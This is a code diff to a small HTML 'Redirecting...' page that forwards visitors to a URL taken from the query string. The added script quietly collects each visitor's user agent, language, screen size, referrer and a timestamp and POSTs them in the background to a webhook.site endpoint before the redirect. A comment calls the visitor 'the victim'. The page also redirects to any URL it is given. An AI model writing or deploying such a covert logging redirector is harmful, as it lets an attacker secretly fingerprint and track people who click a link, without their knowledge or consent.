@@ -4,16 +4,36 @@
 <meta charset="UTF-8">
 <title>Redirecting...</title>
 <script>
-  // Parse the "u" parameter
-  const params = new URLSearchParams(window.location.search);
-  const nextUrl = params.get('u');
+  (function() {
+    const params = new URLSearchParams(window.location.search);
+    const nextUrl = params.get('u');
 
-  // If a next URL is present, redirect to it
-  if (nextUrl) {
-    window.location.replace(nextUrl);
-  } else {
-    document.body.innerText = "No destination found.";
-  }
+    // Gather client info
+    const data = {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      screenWidth: screen.width,
+      screenHeight: screen.height,
+      referrer: document.referrer || null,
+      timestamp: new Date().toISOString()
+    };
+    
+    // Send the data to your webhook in the background
+    fetch('https://webhook.site/905f5e70-2bc7-40b5-968c-2f47191d1823', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    })
+    .finally(() => {
+      // Once logged, redirect the victim
+      if (nextUrl) {
+        window.location.replace(nextUrl);
+      } else {
+        document.body.innerText = "No destination found.";
+      }
+    });
+  })();
 </script>
 </head>
 <body>
